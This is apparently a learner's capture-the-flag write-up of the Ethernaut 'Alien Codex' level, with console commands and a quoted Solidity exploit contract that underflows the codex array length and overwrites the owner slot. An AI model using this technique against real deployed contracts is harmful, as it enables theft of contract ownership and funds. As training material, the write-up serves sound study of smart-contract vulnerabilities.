## Alien Codex

0. I skipped this because i did not know what steps to take so I went to Shop and Denial challenges first but I am writing this after completing ...

1. I was able to understand the contract but was not sure how to modify the owner. It was clear that i had to user record(), retract() and revice() and owner is from Ownable contract that is inherited. We need to call the make_contact() and switch contact to true so that we will be able to call the other functions. There is bytes32 array and it can be underflowed.

2. checking the owner = `await contract.owner()` '0x40055E69E7EB12620c8CCBCCAb1F187883301c30'
   checking storage at 0 slot `await web3.eth.getStorageAt(instance, 0)` '0x00000000000000000000000040055e69e7eb12620c8ccbccab1f187883301c30' , the same as owner but it has takes the last of 20 bytes of the slot

3. calling contact as discussed in step 1 `await contract.make_contact()` => then calling retract because after that our bytes array will have the length of last element that an array can hold `await contract.retract()`

4. I understood only bits and pieces by watching Z-sqaures video of alien codex and i won't go in much details here because his explanation is better so watching his video is recommended and followed him for the part because i want to know the vulnerability and not the attack to be gigabrain... maybe i will come back to this challenge to understand how was bytes array was used to manipulate owner as i understand.

5. `p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))`
   '0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6' => position of the 1st slot where the length of array is stored
   `i = BigInt(2\*\*256) - BigInt(p)` 35707666377435648211887908874984608119992236509074197713628505308453184860938n => position of owner => converting hashed value to BitInt, we are able to subtract back to slot 0 of codex arrayv `rewrote the converting line ... from video for reference when i come back`
   `content = '0x' + '0'.repeat(24) + player.slice(2)` '0x000000000000000000000000B7cA5Ae7FFcf1E7846e3C3eDc1bD36b7ff33810a' => the way address to be stored in the slot

   This step mostly prepared data for the next transaction.

6. Final transaction to claim ownership `await contract.revise(i, content, {from: player, gas: 900000})`

7. success

> some extra references from comments from the video for when i come back to this `https://www.youtube.com/watch?v=oGx-EvSsQbE`
> Ethernaut Alien Codex Solution `https://medium.com/coinmonks/ethernaut-alien-codex-solution-74e3b0ca592e`
> CeTesDev solution `https://github.com/CeTesDev/EthernautLevels/blob/main/alien-codex/contracts/Hacker.sol`
> R1oga solution `https://listed.to/@r1oga/13892/ethernaut-levels-19-to-21`
> Cq-blog (best solution) `https://coder-question.com/cq-blog/525391` does not work
> what he thought the best and indepth solution and explaination ... the link does not work :(
> CeTesDev solution github solution code in case the links change in future :)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() public {
    hacker = msg.sender;
  }

  function attack(address _target) public onlyHacker {
    AlienCodex alienCodex = AlienCodex(_target);

    // 1. Make contact
    alienCodex.make_contact();

    // 2. Cause underflow of the length of codex
    alienCodex.retract();

    // 3. Now can access any slot of the storage
    // Calculate the index in codex array that is corresponding to the slot 0, where owner & contact exist at
    uint256 index = 2**256 - 1 - uint256(keccak256(abi.encode(1))) + 1;

    // 4. Overwrite the owner
    alienCodex.revise(index, bytes32(uint256(address(msg.sender))));
  }
}
```

> Challenge Inspiration (underhanded contest) -:https://weka.medium.com/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079
